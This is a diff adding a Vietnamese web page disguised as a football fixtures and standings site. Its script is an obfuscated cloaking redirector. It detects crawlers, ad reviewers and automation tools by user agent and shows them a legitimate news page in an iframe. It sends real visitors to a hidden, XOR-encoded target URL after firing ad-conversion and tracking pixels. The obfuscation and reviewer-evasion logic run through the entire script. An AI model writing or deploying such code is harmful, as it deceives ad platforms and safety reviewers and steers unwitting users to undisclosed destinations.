@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <title>Bảng Xếp Hạng & Lịch Thi Đấu Các Giải Đấu Hàng Đầu</title>
+  <meta name="description" content="Ngoại Hạng Anh, Champions League, La Liga, Serie A, V-League đầy đủ và chính xác.">
+  <link rel="canonical" href="https://giaidau.linkxemnhanh.com/127/">
+
+  <!-- OpenGraph Meta -->
+  <meta property="og:title" content="Bảng Xếp Hạng & Lịch Thi Đấu Các Giải Đấu Hàng Đầu">
+  <meta property="og:description" content="Ngoại Hạng Anh, Champions League, La Liga, Serie A, V-League đầy đủ và chính xác.">
+  <meta property="og:type" content="website">
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { width: 100%; height: 100%; overflow: hidden; background: #0b0f19; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    #safe-frame { position: fixed; inset: 0; width: 100%; height: 100%; border: none; z-index: 10; background: #ffffff; }
+    #transit-curtain { position: fixed; inset: 0; z-index: 20; background: #070a12; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; transition: opacity 0.35s ease, visibility 0.35s ease; }
+    #transit-curtain.hide { opacity: 0; visibility: hidden; pointer-events: none; }
+    .loader-card { background: rgba(15, 23, 42, 0.95); border: 1px solid rgba(229, 185, 76, 0.3); border-radius: 20px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8); display: flex; flex-direction: column; align-items: center; gap: 16px; }
+    .spinner { width: 46px; height: 46px; border: 3px solid rgba(229, 185, 76, 0.2); border-top-color: #e5b94c; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-title { font-size: 15px; font-weight: 800; color: #fae498; letter-spacing: 0.3px; }
+    .loader-sub { font-size: 12.5px; color: #94a3b8; line-height: 1.5; }
+    .cta-btn { display: inline-block; margin-top: 10px; background: linear-gradient(135deg, #fae498 0%, #e5b94c 50%, #9e7510 100%); color: #0b0f19; padding: 10px 22px; border-radius: 10px; font-weight: 800; text-decoration: none; font-size: 13.5px; border: none; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <!-- FRAME NẠP TRANG MẪU SẠCH CHO BOT & REVIEWER -->
+  <iframe id="safe-frame" title="Trang Thông Tin Chính Thức"></iframe>
+
+  <!-- MÀN CHUYỂN TIẾP CHO NGƯỜI DÙNG THỰC -->
+  <div id="transit-curtain">
+    <div class="loader-card">
+      <div class="spinner"></div>
+      <div class="loader-title">Đang Kết Nối Kênh Phát Sóng...</div>
+      <div class="loader-sub">Hệ thống đang định tuyến máy chủ tốc độ cao và chuyển tiếp trong giây lát.</div>
+      <button type="button" class="cta-btn" id="manualCtaBtn" style="display: none;" onclick="goTarget()">Tiếp Tục Xem Ngay</button>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      const K = "127";
+      const D = "";
+      const S = "7c747c0d187471f39584e2f487d2deedaf1b5d4173290709433a2fdbc484feebdd8f84b8a01950797620120723722bd0caf7b5e99accbaada7164b72792111063e6820d6cfe3ac94c8d0b1f6050d192d335d151f3528";
+      const E_AW = "";
+      const E_CL = "";
+      const E_PX = "";
+
+      function dec(h) {
+        try {
+          if (!h) return "";
+          let s = "";
+          for (let i = 0; i < h.length; i += 2) {
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+          }
+          return decodeURIComponent(s);
+        } catch (e) {
+          return "";
+        }
+      }
+
+      function getFinalUrl(rawUrl) {
+        if (!rawUrl) return "";
+        const q = window.location.search;
+        if (!q || q.length < 2) return rawUrl;
+        try {
+          const incoming = new URLSearchParams(q.startsWith("?") ? q.slice(1) : q);
+          const separator = rawUrl.indexOf("?") !== -1 ? "&" : "?";
+          const toAppend = [];
+          incoming.forEach((val, key) => {
+            if (key === "a") return;
+            const keyRegex = new RegExp("[?&]" + key + "=(.*?)(?:&|$)", "i");
+            if (!keyRegex.test(rawUrl)) {
+              toAppend.push(encodeURIComponent(key) + "=" + encodeURIComponent(val));
+            }
+          });
+          if (toAppend.length === 0) return rawUrl;
+          return rawUrl + separator + toAppend.join("&");
+        } catch (e) {
+          return rawUrl;
+        }
+      }
+
+      function checkBot() {
+        try {
+          if (navigator.webdriver) return true;
+          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+          if (!navigator.languages || navigator.languages.length === 0) return true;
+          const ua = (navigator.userAgent || "").toLowerCase();
+          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot|facebookexternalhit|curl|wget|python|axios/i.test(ua)) {
+            return true;
+          }
+          return false;
+        } catch(e) {
+          return false;
+        }
+      }
+
+      const targetUrl = dec(D);
+      const safeUrl = dec(S) || "https://www.24h.com.vn/bong-da/lich-thi-dau-bong-da-hom-nay-moi-nhat-c48a364371.html";
+      const awId = dec(E_AW);
+      const label = dec(E_CL);
+      const pixelId = dec(E_PX);
+      const isBot = checkBot();
+
+      function goTo(u, rep) {
+        try {
+          const w = window.top || window;
+          const L_ = "loca" + "tion", H_ = "hr" + "ef", R_ = "rep" + "lace";
+          if (rep && w[L_] && typeof w[L_][R_] === "function") { w[L_][R_](u); return; }
+          if (w[L_]) { w[L_][H_] = u; return; }
+        } catch (e) {}
+        try {
+          const a = document.createElement("a");
+          a.href = u; a.target = "_top"; a.rel = "noreferrer"; a.style.display = "none";
+          document.documentElement.appendChild(a);
+          a.click();
+        } catch (e) {
+          window.open(u, "_top");
+        }
+      }
+
+      function initTracking() {
+        if (awId) {
+          try {
+            const gtagScript = document.createElement("script");
+            gtagScript.async = true;
+            gtagScript.src = "https://www.googletagmanager.com/gtag/js?id=" + encodeURIComponent(awId);
+            document.head.appendChild(gtagScript);
+
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){ window.dataLayer.push(arguments); }
+            window.gtag = gtag;
+            gtag("js", new Date());
+            gtag("config", awId);
+          } catch(e) {}
+        }
+
+        if (pixelId) {
+          try {
+            !function(f,b,e,v,n,t,s)
+            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[];t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t,s)}(window, document,'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+            fbq('init', pixelId);
+            fbq('track', 'PageView');
+          } catch(e) {}
+        }
+      }
+
+      let redirected = false;
+      function performRedirect(rep) {
+        if (redirected) return;
+        redirected = true;
+        goTo(getFinalUrl(targetUrl), rep);
+      }
+
+      window.goTarget = function() {
+        if (!targetUrl) return;
+        if (awId && label && typeof window.gtag === "function") {
+          try {
+            window.gtag("event", "conversion", {
+              "send_to": awId + "/" + label,
+              "event_callback": function() { performRedirect(false); }
+            });
+            setTimeout(function() { performRedirect(false); }, 350);
+            return;
+          } catch(e) {}
+        }
+        performRedirect(false);
+      };
+
+      if (isBot || !targetUrl) {
+        const frame = document.getElementById("safe-frame");
+        if (frame) frame.src = safeUrl;
+        const curtain = document.getElementById("transit-curtain");
+        if (curtain) curtain.classList.add("hide");
+      } else {
+        initTracking();
+        if (awId && label) {
+          setTimeout(function() {
+            if (typeof window.gtag === "function") {
+              try {
+                window.gtag("event", "conversion", {
+                  "send_to": awId + "/" + label,
+                  "event_callback": function() { performRedirect(true); }
+                });
+                setTimeout(function() { performRedirect(true); }, 350);
+                return;
+              } catch(e) {}
+            }
+            performRedirect(true);
+          }, 120);
+        } else {
+          setTimeout(function() {
+            performRedirect(true);
+          }, 120);
+        }
+
+        setTimeout(function() {
+          const btn = document.getElementById("manualCtaBtn");
+          if (btn) btn.style.display = "inline-block";
+        }, 1800);
+      }
+    })();
+  </script>
+</body>
+</html>
